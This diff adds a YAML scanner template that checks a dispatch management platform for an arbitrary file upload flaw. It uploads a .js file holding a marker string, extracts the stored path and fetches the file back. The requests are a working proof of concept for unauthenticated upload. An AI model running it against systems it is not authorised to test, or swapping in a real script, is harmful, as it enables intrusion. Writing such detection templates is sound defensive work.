@@ -1,0 +1,63 @@
+id: kirisun-platform-uploadfile-upload
+info:
+  name: 指挥调度管理平台 event—uploadfile任意文件上传
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件上传
+
+variables:
+  boundary: "----WebKitFormBoundary25qW4eG1Jt50iyf7"
+  test_file: "1.js"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /api/client/event/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        {{boundary}}
+        Content-Disposition: form-data; name="uuid"
+
+        1
+        {{boundary}}
+        Content-Disposition: form-data; name="number"
+
+        1
+        {{boundary}}
+        Content-Disposition: form-data; name="uploadfile"; filename="{{test_file}}"
+        Content-Type: image/png
+
+        vulnerability
+        {{boundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "successed"
+    extractors:
+      - type: regex
+        name: filepath
+        internal: true
+        part: body
+        regex:
+          - "event\\\\/(?P<filepath>.*?).js"
+
+  - raw:
+      - |
+        POST /upload/event/{{filepath}}.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "vulnerability"
